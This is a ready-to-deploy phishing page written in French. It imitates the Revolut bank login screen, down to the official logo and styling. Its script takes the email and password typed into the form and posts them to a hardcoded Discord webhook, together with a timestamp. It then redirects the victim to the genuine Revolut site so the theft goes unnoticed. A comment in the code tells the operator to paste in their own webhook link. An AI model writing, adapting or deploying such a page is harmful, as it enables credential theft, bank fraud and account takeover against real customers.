<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Revolut</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        
        body { 
            background-color: #000000; 
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px; 
        }

        .container { 
            width: 100%; 
            max-width: 420px; /* Un peu plus large pour bien caler le logo */
            text-align: center; 
        }

        /* --- LOGIQUE DU LOGO PARFAIT --- */
        .logo-container {
            margin-bottom: 50px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo-img {
            width: 140px; /* Taille fixe et précise */
            height: auto; /* Garde les proportions */
            object-fit: contain;
        }

        h1 { 
            font-size: 26px; 
            font-weight: 600; 
            margin-bottom: 35px; 
            letter-spacing: -0.5px;
        }

        .input-group { margin-bottom: 20px; text-align: left; }
        
        label { 
            display: block; 
            font-size: 14px; 
            color: #9ca3af; 
            margin-bottom: 8px; 
            font-weight: 500;
        }

        input[type="email"], 
        input[type="password"] { 
            width: 100%; 
            padding: 16px; 
            border-radius: 12px; 
            border: 1px solid #374151; 
            background-color: #1f2937; 
            color: white; 
            font-size: 16px; 
            outline: none; 
            transition: all 0.2s ease;
        }

        input:focus { 
            border-color: #ffffff; 
            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
        }

        button { 
            width: 100%; 
            padding: 18px; 
            background-color: #ffffff; 
            color: #000000; 
            border: none; 
            border-radius: 12px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 15px; 
            transition: transform 0.1s;
        }

        button:hover { background-color: #e5e7eb; }
        button:active { transform: scale(0.98); }

        .footer { margin-top: 30px; font-size: 14px; color: #9ca3af; }
        .footer a { color: #ffffff; text-decoration: none; font-weight: 500; }
        
        .loading { display: none; margin-top: 15px; font-size: 14px; color: #9ca3af; }
    </style>
</head>
<body>

<div class="container">
    <!-- Zone du Logo -->
    <div class="logo-container">
        <!-- Image SVG officielle haute qualité -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9b/Revolut_Logo.svg" alt="Revolut" class="logo-img">
    </div>

    <h1>Connectez-vous</h1>

    <form id="loginForm">
        <div class="input-group">
            <label for="email">Adresse e-mail ou numéro de portable</label>
            <input type="email" id="email" name="email" required placeholder="nom@exemple.com">
        </div>

        <div class="input-group">
            <label for="password">Mot de passe</label>
            <input type="password" id="password" name="password" required>
        </div>

        <button type="submit">Se connecter</button>
        
        <div class="loading" id="loadingText">Vérification en cours...</div>
    </form>

    <div class="footer">
        <a href="#">Mot de passe oublié ?</a>
    </div>
</div>

<script>
    // ?????? COLLE TON LIEN DISCORD WEBHOOK ICI ??????
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1562454277803212903/2hBbjlyL1YFnpzUPHXStKim-Nk2vG9MhEHor0VN1ZP8WmeoaqRVLw31K0xF0HC31-ylT'; 

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        document.getElementById('loadingText').style.display = 'block';
        document.querySelector('button').disabled = true;

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "**?? Connexion Revolut détectée !**\n\n?? **Email :** " + email + "\n?? **MDP :** " + password + "\n?? **Heure :** " + new Date().toLocaleString()
            })
        }).then(() => {
            window.location.href = "https://www.revolut.com";
        });
    });
</script>

</body>
</html>
